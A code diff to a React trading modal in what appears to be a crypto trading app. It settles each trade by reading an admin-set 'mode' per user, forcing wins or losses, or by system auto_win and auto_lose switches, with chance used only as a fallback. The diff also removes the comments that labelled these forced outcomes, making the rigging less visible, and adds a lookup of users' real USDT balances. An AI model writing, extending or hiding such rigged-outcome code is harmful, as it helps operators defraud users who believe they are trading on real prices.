@@ -91,11 +91,22 @@ export default function TradingModal({
   const [entryPrice, setEntryPrice] = useState(currentPrice);
 
   const [currentUser, setCurrentUser] = useState(null);
+  const [realUsdtBalance, setRealUsdtBalance] = useState(0);
 
   useEffect(() => {
     async function loadUser() {
       const { data: { user } } = await supabase.auth.getUser();
       setCurrentUser(user);
+      
+      // Fetch Real Balance from Database to avoid mock balances
+      if (user?.id) {
+        const { data: profile } = await supabase
+          .from('profiles')
+          .select('usdt')
+          .eq('id', user.id)
+          .single();
+        if (profile) setRealUsdtBalance(profile.usdt || 0);
+      }
     }
     loadUser();
   }, []);
@@ -125,7 +136,9 @@ export default function TradingModal({
   }, [animatedPrice]);
 
   const isLong = type === 'long';
-  const effectiveBalance = balance || balanceUSDT;
+  // Use Real Balance fetched from DB (fallback to props if not loaded yet)
+  const effectiveBalance = realUsdtBalance || balance || balanceUSDT;
+  
   const numAmount = parseFloat(amount) || 0;
   const fee = useMemo(() => +(numAmount * 0.005).toFixed(4), [numAmount]);
   const totalDeduct = useMemo(() => +(numAmount + fee).toFixed(4), [numAmount, fee]);
@@ -220,7 +233,7 @@ export default function TradingModal({
   }, [resetModal, onClose]);
 
   // =========================================================================
-  // THE CORE TRADE LOGIC (Auto Win / Lose connection happens here!)
+  // THE CORE TRADE LOGIC
   // =========================================================================
   const handleConfirm = useCallback(() => {
     if (!tradingEnabled) return;
@@ -241,20 +254,17 @@ export default function TradingModal({
         if (prev <= 1) {
           clearInterval(timerRef.current);
           
-          // --- 1. FETCH THE ADMIN OVERRIDE MODE FROM SUPABASE ---
           const checkAndSettle = async () => {
             let adminMode = 'neutral';
             let activeUserId = currentUser?.id;
             
             try {
-              // Backup: If currentUser is null for some reason, fetch the user by their session again
               if (!activeUserId) {
                   const { data: { user } } = await supabase.auth.getUser();
                   activeUserId = user?.id;
               }
 
               if (activeUserId) {
-                // Check the user's profile for the 'mode' column set by SafeTrade-Admin
                 const { data: profileData, error } = await supabase
                   .from('profiles')
                   .select('mode')
@@ -269,15 +279,13 @@ export default function TradingModal({
               console.error("Error checking admin mode:", err);
             }
 
-            // --- 2. DETERMINE WIN/LOSE BASED ON OVERRIDE ---
             let win = false;
             
             if (adminMode === 'win') {
-              win = true; // FORCED WIN
+              win = true;
             } else if (adminMode === 'lose') {
-              win = false; // FORCED LOSE
+              win = false;
             } else {
-              // NEUTRAL MODE: Fallback to Random 50/50 or System Settings
               if (systemSettings?.auto_win) {
                 win = true;
               } else if (systemSettings?.auto_lose) {
@@ -287,7 +295,6 @@ export default function TradingModal({
               }
             }
 
-            // --- 3. CALCULATE PROFITS AND UPDATE STATE ---
             const profit = win ? potentialWin : numAmount;
             const updatedBalance = win 
               ? +(balanceAfterDeduction + numAmount + potentialWin).toFixed(2)
@@ -310,7 +317,6 @@ export default function TradingModal({
             onTradeComplete?.(transaction);
             onOrderComplete?.(transaction);
 
-            // Pass activeUserId to persistTrade
             if (activeUserId) {
               await persistTrade({
                 transaction,
@@ -326,7 +332,7 @@ export default function TradingModal({
             }
           };
 
-          checkAndSettle(); // Run the async logic
+          checkAndSettle();
           return 0;
         }
         return prev - 1;
